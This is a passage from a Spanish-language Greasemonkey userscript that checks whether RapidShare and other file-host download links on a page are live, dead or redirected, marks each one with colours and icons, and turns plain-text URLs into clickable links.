GM_addStyle("#link_vivo {background:transparent url("+urlimg+"lvivo.png) no-repeat scroll 100% 50%;padding-right:17px;}"+
			"#link_muerto {background:transparent url("+urlimg+"lmuerto.png) no-repeat scroll 100% 50%;padding-right:17px;}"+
			"#link_inaccesible {background:transparent url("+urlimg+"linaccesible.png) no-repeat scroll 100% 50%;padding-right:17px;}"+
			"#link_redirector {background:transparent url("+urlimg+"lredirector.png) no-repeat scroll 100% 50%;padding-right:65px;}");

////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Procesar los links
////////////////////////////////////////////////////////////////////////////////////////////////////////
verificar_links();

var links = document.getElementsByTagName('a');
for (var i = 0; i < links.length; i++){
	var urll = unescape(links[i].href.replace(/\+/g, ' '));
	urll = urll.replace(/\?killcode=[\d]*/gi,'');
	if (urll.search(RegExp('Javascript:|' + location.hostname + '|^$','gi')) == -1) {
			links[i].href = unescape(links[i].href.replace(/\+/g, ' ')).replace(/^[\s]*/,'').replace(/[\s]*$/,'').replace(redirectores2_regex, '').replace(/^\s*|\s*^$/g, '');
			links[i].innerHTML = links[i].innerHTML.replace(redirectores2_regex, '');
			if (links[i].href.search(redirectores_regex) != -1){
				mostrar_estado(urll, "REDIR");
			} else {
				if (links[i].href.search(todos_rapidshare_regex) != -1){
					var urll = links[i].href;
					numerodelinksRS++;
					urll = urll.replace(/^.*?http:\/\/rapidshare/gi,'http://rapidshare');
					urll = urll.replace(/^.*?http%3A%2F%2Frapidshare/gi,'http://rapidshare');
					urll = urll.replace(/\?killcode=[\d]*/gi,'');
					urll = urll.replace(/%2F/gi,'/');
					urll = urll.replace(/%3A/gi,':');
					var cadena = ''+numerodelinksRS+'';
					if (cadena.search(/\d00/) != -1){
						todos.push('xxxczxczxcsasdasdasdx4234');
					}
						todos.push(urll);
				} else {
					for (var ii = 0; ii < hosts.length; ii++){
						if (links[i].href.search(hosts[ii][1]) != -1) {
							otros_links.push(urll);
							otros_links_cant = otros_links_cant + 1;
							otros_vivos.push(hosts[ii][2]);
							otros_muertos.push(hosts[ii][3]);
							otros_peso.push(hosts[ii][4]);
							break;
						} else {
							if (ii == hosts.length - 1)
								comprueba_extension(links[i].href);
						}
					}
				}
			}
	}
}
todos = todos.join();
todos = todos.replace(/,/gi,'\n');
var todos=todos.split("xxxczxczxcsasdasdasdx4234");
if (numerodelinksRS > 0){
	validar_links_rs(todos);
}

verificar_otros_links(otros_links);

////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Funciones
////////////////////////////////////////////////////////////////////////////////////////////////////////
function validar_links_rs(todos){
	for (var i = todos.length - 1; i >= 0; i--) {
		GM_xmlhttpRequest({
			method: "POST",
			url: 'http://rapidshare.com/cgi-bin/checkfiles.cgi',
			headers:{'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey', 'Content-type':'application/x-www-form-urlencoded'},
			data:'urls='+encodeURIComponent(todos[i]),
			onload:function(resultado) {
				res=resultado.responseText;
				noencontrado = res.match(/inexistent<\/td><\/tr><\/table>    \n<div class="downloadlink">http:\/\/rapidshare\.com\/files\/(\d*)\/.*<\/div>/g);
				linkvivo = res.match(/load<\/a><\/td><\/tr><\/table>    \n<div class="downloadlink">http:\/\/rapidshare\.com\/files\/(\d*)\/.*<\/div>/g);
				if (noencontrado){
					var linksnoencontrados = new Array();   
					for (var i = noencontrado.length - 1; i >= 0; i--) {
						var string=noencontrado[i];
						var regex = /inexistent<\/td><\/tr><\/table>    \n<div class="downloadlink">http:\/\/rapidshare\.com\/files\/(\d*)\/.*<\/div>/;
						matchArray=string.match(regex);
						linksnoencontrados.push(matchArray[1]);
					}
					if (linksnoencontrados){
						MostrarLinksBorrados(linksnoencontrados);
					}
				}
				if (linkvivo){
					var linksvivos = new Array();   
					for (var i = linkvivo.length - 1; i >= 0; i--) {
						var string=linkvivo[i];
						var regex2 = /load<\/a><\/td><\/tr><\/table>    \n<div class="downloadlink">http:\/\/rapidshare\.com\/files\/(\d*)\/.*<\/div>/;
						matchArraylive=string.match(regex2);
						linksvivos.push(matchArraylive[1]);
					}
					if (linksvivos){
						MostrarLinksVivos(linksvivos);
					}
				}
			}
		});
	}
}
function MostrarLinksBorrados(linksnoencontrados){
	var xpathlinksnoencontrados = "//a[contains(@href,\'" + linksnoencontrados.join('\') or contains(@href,\'') +"\')]";
	var todosLinks, esteLink;
	todosLinks = document.evaluate( xpathlinksnoencontrados, document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);
	for (var i = 0; i < todosLinks.snapshotLength; i++) {
			var esteLink = todosLinks.snapshotItem(i);
			mostrar_estado(esteLink.href,"MUERTO");
	}
}

function MostrarLinksVivos(linksvivos){
	var xpathlinksvivos = "//a[contains(@href,\'" + linksvivos.join('\') or contains(@href,\'') +"\')]";
	var todosLinksvivos, esteLink;
	todosLinksvivos = document.evaluate( xpathlinksvivos, document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);
	for (var i = 0; i < todosLinksvivos.snapshotLength; i++) {
			var esteLink = todosLinksvivos.snapshotItem(i);
			mostrar_estado(esteLink.href,"VIVO");
	}
}

function verificar_otros_links(otros_links){
	for (var i = 0; i < otros_links.length; i++){
		var archivo_vivo = otros_vivos[i];
		var archivo_muerto = otros_muertos[i];
		var archivo_peso = otros_peso[i];
		var URL = otros_links[i];
		var ret = otros_links_get(URL, archivo_vivo, archivo_muerto, archivo_peso);
	}
}
function otros_links_get(URL, archivo_vivo, archivo_muerto, archivo_peso){
	GM_xmlhttpRequest({
		method: 'GET',
		url: URL,
		headers: { 'User-agent': 'Mozilla/4.0 [es] (Windows NT 6.0; U)', }, 
		onload: function(resultado){
			if (resultado.status == 200) {
				if (resultado.responseText.search(archivo_muerto) != -1 && archivo_muerto != ""){
					mostrar_estado(URL, "MUERTO");
				} else {
					if (resultado.responseText.search(archivo_vivo) == -1) {
						mostrar_estado(URL, "MUERTO");
					} else {
						if (archivo_peso != '') {
							var TAM = resultado.responseText.match(archivo_peso);
						}
						mostrar_estado(URL, "VIVO", TAM);
					}
				}
			} else {
				mostrar_estado(URL, "NODISP", TAM);
			}
		},
		onerror: function(resultado){
			mostrar_estado(URL, "NODISP");
		}
	});
}

function comprueba_extension(URL) {
	URL2 = unescape(URL.replace(/\+/g,  " "));
	extensiones_permitidas = new Array(".rar", ".zip", ".exe", ".pdf", ".doc", ".mp3");
	empiezo = URL2.lastIndexOf(".");
	extension = URL2.substring(empiezo,empiezo+5).replace(/\s/g,'').toLowerCase();
	permitida = false;
	for (var i = 0; i < extensiones_permitidas.length; i++) {
		if (extensiones_permitidas[i] == extension) {
			permitida = true;
			break;
		}
	}
	if (permitida) otros_links_directos(URL);
}

function otros_links_directos(URL){
	GM_xmlhttpRequest({
		method: 'HEAD',
		url: URL,
		headers: { 'User-agent': 'Mozilla/4.0 [es] (Windows NT 6.0; U)', }, 
		onload: function(resultado){
			if(resultado.responseHeaders == '')
				mostrar_estado(URL, "MUERTO");
			else
				mostrar_estado(URL, "VIVO");
		},
		onerror: function(resultado){
				mostrar_estado(URL, "NODISP");
		}
	});
}

function mostrar_estado(URL, uTipo, kb){
	var bgc = "";
	var lnk = "";
	var dec = "";
	var tit = "";
	var clt = "";
	switch(uTipo){
		case "MUERTO":
			bgc = color_link_muerto;
			clt = color_texto_mal;
			lnk = 'link_muerto';
			dec = 'line-through';
			tit = 'El link está muerto o desactivado';
			break;
		case "NODISP":
			bgc = color_link_nodisp;
			clt = color_texto_mal;
			lnk = 'link_inaccesible';
			dec = '';
			tit = 'La página esta inaccesible';
			break;
		case "VIVO":
			bgc = color_link_vivo;
			clt = color_texto_bien;
			dec = "";
			lnk = 'link_vivo';
			tit = 'El link de descarga funciona correctamente';
			break;
		case "REDIR":
			bgc = color_link_muerto;
			clt = color_texto_mal;
			lnk = 'link_redirector';
			dec = '';
			tit = 'Redirector. Imposible de verificar estado del link';
			break;
		default:
			break;
	}
	var xpathotroslinks = "//a[contains(@href,\'"+URL+"\')]";
	var todosLinks;
	todosLinks = document.evaluate( xpathotroslinks, document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);
	for (var i = 0; i < todosLinks.snapshotLength; i++) {
		var esteLink = todosLinks.snapshotItem(i);
		if(esteLink.id != lnk) {
			esteLink.id = lnk;
			esteLink.style.textDecoration = dec;
			esteLink.title = tit;
			if (kb != undefined) {
				kb = kb[0].toUpperCase().replace(/,/gi, '.');
				var kb1 = /[\d.]+/.exec(kb);
				var kb2 = /[KM]B/.exec(kb);
				if (esteLink.innerHTML.replace(/^\s*|\s*^$/g, '').indexOf(unescape(esteLink.href.replace(/\+/g, ' '))) != -1) {
					esteLink.innerHTML = '<font style="font-size: 13px;color:'+clt+';background-Color:'+bgc+'">['+kb1+' '+kb2+'] ==> '+unescape(esteLink.href.replace(/\+/g, ' '))+'</font>';
				} else {
					esteLink.innerHTML = '<b>'+esteLink.innerHTML+'</b><br/><font style="font-size: 13px;color:'+clt+';background-Color:'+bgc+'">['+kb1+' '+kb2+'] ==> '+unescape(esteLink.href.replace(/\+/g, ' '))+'</font>';
				}
			} else {
				if (esteLink.innerHTML.replace(/^\s*|\s*^$/g, '').indexOf(unescape(esteLink.href.replace(/\+/g, ' '))) != -1) {
					esteLink.innerHTML = '<font style="font-size: 13px;color:'+clt+';background-Color:'+bgc+'">'+unescape(esteLink.href.replace(/\+/g, ' '))+'</font>';
				} else {
					esteLink.innerHTML = '<b>'+esteLink.innerHTML+'</b><br/><font style="font-size: 13px;color:'+clt+';background-Color:'+bgc+'">'+unescape(esteLink.href.replace(/\+/g, ' '))+'</font>';
				}
			}
		}
	}
}

function verificar_links2(){
	var regex = /((?:https?|ftp):\/\/[^\s'"'<>()]*|[-\w.+]+@(?:[-\w]+\.)+[\w]{2,6})/gi;
	var regex_excluir = /http:\/\/uploading\.com|http:\/\/letitbit.net|http:\/\/www.gshare\.com/gi;
	var regex_fin = /\.rar\.html\b/gi;
	TextoAlt = $('')
}

function verificar_links(){
	try{
		var regex = /((?:https?|ftp):\/\/[^\s'"'<>()]*|[-\w.+]+@(?:[-\w]+\.)+[\w]{2,6})/gi;
		var regex_excluir = /http:\/\/uploading\.com|http:\/\/letitbit.net|http:\/\/www.gshare\.com/gi;
		var regex_fin = /\.rar\.html\b/gi;
		var TextoAlt, tekst, muligtLink;
		var Tags = ['a', 'head', 'script', 'style', 'textarea', 'title', 'option', 'code', 'span[contains(@id,"citar_")]', 'div[contains(@class,"monitor_comentario")]'];
		var path = "//text()[not(parent::" + Tags.join(" or parent::") +")]";
		TextoAlt = document.evaluate(path, document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		for(var i=0;i<TextoAlt.snapshotLength;i++){
			tekst = TextoAlt.snapshotItem(i);
			muligtLink = tekst.nodeValue;
			if(regex.test(muligtLink)){
				var span = document.createElement('span');
				var ultimoencontrado = 0;
				regex.lastIndex = 0;
				for(vector = null; vector = regex.exec(muligtLink); ){
					var link = vector[0];
					span.appendChild(document.createTextNode(muligtLink.substring(ultimoencontrado, vector.index)));
					var href = link;

					href = href.replace(/^[\s]*/, '');
					if (href.search(/^(?:https?|ftp):\/\//) == -1 && href.search("@") == -1){
						href = 'http://'+href;
					}
					
					if (href.search(regex_excluir) == -1){
						if (href.search(regex_fin) != -1){
							href = href.substr(0, href.length - 5);
						}
					}
					var a = document.createElement('a');
					a.setAttribute('href', href);
					a.setAttribute('target', '_blank');
					a.appendChild(document.createTextNode(href));
					span.appendChild(a);
					ultimoencontrado = regex.lastIndex;
				}
				span.appendChild(document.createTextNode(muligtLink.substring(ultimoencontrado)));
				tekst.parentNode.replaceChild(span, tekst);
			}
		}
	} catch(e){alert(e);}
}

}

if(LinkCheck) linkchecker();
else $('#linkchecker').click(function(){linkchecker();return false;});